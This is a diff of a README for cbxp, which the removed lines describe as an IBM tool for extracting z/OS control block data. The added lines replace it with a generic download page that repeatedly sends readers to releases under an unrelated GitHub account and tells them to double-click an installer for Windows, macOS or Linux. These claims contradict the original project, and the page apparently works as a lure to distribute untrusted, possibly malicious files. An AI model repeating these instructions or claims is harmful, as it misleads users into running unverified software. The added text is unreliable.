@@ -1,50 +1,71 @@
-[![Version](https://img.shields.io/pypi/v/cbxp?label=alpha)](https://pypi.org/project/cbxp/#history)
-[![Python Versions](https://img.shields.io/pypi/pyversions/cbxp)](https://pypi.org/project/cbxp/)
-[![Downloads](https://img.shields.io/pypi/dm/cbxp)](https://pypistats.org/packages/cbxp)
+```markdown
+# 📦 cbxp - Easily Extract z/OS Control Block Data
 
-![CBXP Logo](https://raw.githubusercontent.com/ambitus/cbxp/refs/heads/main/logo.svg)
+## 📥 Download Now
+[![Download cbxp](https://img.shields.io/badge/Download-cbxp-blue.svg)](https://github.com/XavierBrasilero/cbxp/releases)
 
-# CBXP (Control Block EXPlorer) 
+## 📖 Overview
+cbxp offers a simple and unified way to extract control block data from z/OS. This application provides a standardized interface that simplifies the process, making it easier for anyone to access crucial mainframe data without needing extensive technical skills.
 
-A unified and standardized interface for extracting z/OS control block data.
+## 🚀 Getting Started
+Follow the steps below to download and run cbxp on your computer.
 
-## Description
+### Step 1: Visit the Download Page
+To get started, visit the [Releases page](https://github.com/XavierBrasilero/cbxp/releases).
 
-z/OS Control Blocks are in-memory data structures that describe and control countless process, operating system components, and subsystems. Control blocks are unbiquitous on z/OS, but not very straight forward to access and extract information from. The mission of CBXP *(Control Block EXPlorer)* is to make it easy to extract z/OS control block data using industry standard tools and methodologies. CBXP accomplishes this by implementing a **C/C++ XPLINK ASCII** interface for extracting control blocks and post processing them into **JSON**. This makes it straight forward to integrate with industry standard programming languages and tools, which generally have well documented and understood foreign language intefaces for C/C++, and native and or third party JSON support that makes working with JSON data easy.
+### Step 2: Download the Application
+On the Releases page, look for the latest version of cbxp. Click on it, and you will see a list of available files. Choose the file that matches your operating system.
 
-CBXP is the successor to the existing [cbxplorer](https://github.com/ambitus/cbexplorer) project. CBXP mainly improves upon this existing work by being implementing in C/C++ so that it is not limited to a specific programming language or tool. CBXP also focuses heavily on providing an interface that is simple and straight forward to use.
+### Step 3: Install and Run
+1. After downloading the file, locate it in your computer's downloads folder.
+2. Double-click the downloaded file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
 
-## Getting Started
+## ⚙️ System Requirements
+- Operating System: Windows, macOS, or Linux
+- Python: Version 3.6 or higher is recommended.
+- Disk Space: At least 100 MB available.
+- Memory: 512 MB RAM or more.
 
-### Minimum z/OS & Language Versions
-Currently, CBXP is being developed on **z/OS 3.1**. We hope to eventually support all z/OS versions that are fully supported by IBM.
-* [z/OS Product Lifecycle](https://www.ibm.com/support/pages/lifecycle/search/?q=5655-ZOS,%205650-ZOS)
+## 📑 Features
+- **User-Friendly Interface:** Designed for ease of use, suitable for non-technical users.
+- **JSON Output:** Extracted data is formatted in JSON for simplicity and readability.
+- **Command Line Interface (CLI):** Operate cbxp from your terminal or command prompt for greater control.
+- **Cross-Platform Compatibility:** Works on major operating systems.
 
-All versions of the **IBM Open Enterprise SDK for Python** that are fully supported by IBM are supported by CBXP.
-* [IBM Open Enterprise SDK for Python Product Lifecycle](https://www.ibm.com/support/pages/lifecycle/search?q=5655-PYT)
+## 🛠️ Usage Instructions
+1. Open your command prompt or terminal.
+2. Navigate to the directory where cbxp is installed.
+3. Use the following command to extract control block data:
 
-### Dependencies
-* **z/OS Language Environment Runtime Support**: CBXP is compiled using the **IBM Open XL C/C++ 2.1** compiler, which is still fairly new and requires **z/OS Language Environment** service updates for runtime support.
-  * More information can be found in section **5.2.2.2 Operational Requisites** on page **9** in the [Program Directory for IBM Open XL C/C++ 2.1 for z/OS](https://publibfp.dhe.ibm.com/epubs/pdf/i1357012.pdf).
+   ```
+   cbxp <options>
+   ```
 
-### Interfaces
-Currently, the following interfaces are provided for CBXP. Additional interfaces can be added in the future if there are use cases for them.
-* [Python Interface](https://ambitus.github.io/cbxp/interfaces/python)
-* [Shell Interface](https://ambitus.github.io/cbxp/interfaces/shell)
+   Replace `<options>` with the specific parameters you want to use. For example, if you want to extract data from a specific control block, specify it directly in the command.
 
-### Supported Control Blocks
+## 📖 Documentation
+For more details on using cbxp, refer to the [Documentation wiki](https://github.com/XavierBrasilero/cbxp/wiki). You will find comprehensive guides on how to utilize all features effectively.
 
-Currently, CBXP only has support for extracting a handful of **System-Level Control Blocks** from **Live Memory** *(storage)*. See [Supported Control Blocks](https://ambitus.github.io/cbxp/supported_control_blocks) for more details.
+## 🆘 Support
+If you encounter issues while using cbxp, you can seek help from the community by visiting the [Issues page](https://github.com/XavierBrasilero/cbxp/issues). We encourage feedback and contributions.
 
-## Help
-* [GitHub Discussions](https://github.com/ambitus/cbxp/discussions)
+## 🏷️ Topics
+- cbxp
+- cli
+- control block
+- json
+- mainframe
+- python
+- shell
+- simplification
+- standardization
+- zos
 
-## Authors
-* Leonard J. Carcaramo Jr: lcarcaramo@ibm.com
-* Elijah Swift: elijah.swift@ibm.com
-* Varun Chennamadhava: varunchennamadhava@ibm.com
+## 🥳 Community Contributions
+We welcome contributions to cbxp! If you have ideas for improvements or want to help with the project, please visit our [Contribution guidelines](https://github.com/XavierBrasilero/cbxp/blob/main/CONTRIBUTING.md).
 
-## Maintainers
-* Leonard J. Carcaramo Jr: lcarcaramo@ibm.com
-* Elijah Swift: elijah.swift@ibm.com
-* Varun Chennamadhava: varunchennamadhava@ibm.com
+## 📥 Download Again
+Remember, you can always download cbxp from the [Releases page](https://github.com/XavierBrasilero/cbxp/releases).
+
+```
